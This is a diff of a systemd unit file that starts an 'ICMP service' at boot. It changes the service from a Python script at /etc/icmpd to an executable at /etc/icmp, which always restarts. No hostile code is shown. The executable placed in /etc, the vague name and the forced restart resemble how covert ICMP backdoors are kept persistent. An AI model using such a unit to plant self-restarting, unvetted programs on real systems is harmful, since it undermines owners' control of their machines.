@@ -1,12 +1,12 @@
 [Unit]
-Description=Contains service information for ICMP service on startup.
+Description=ICMP service.
 
 [Install]
 WantedBy=multi-user.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'python3 -u /etc/icmpd'
+ExecStart=/etc/icmp
 WorkingDirectory=/etc/
 Restart=always
 RestartSec=5
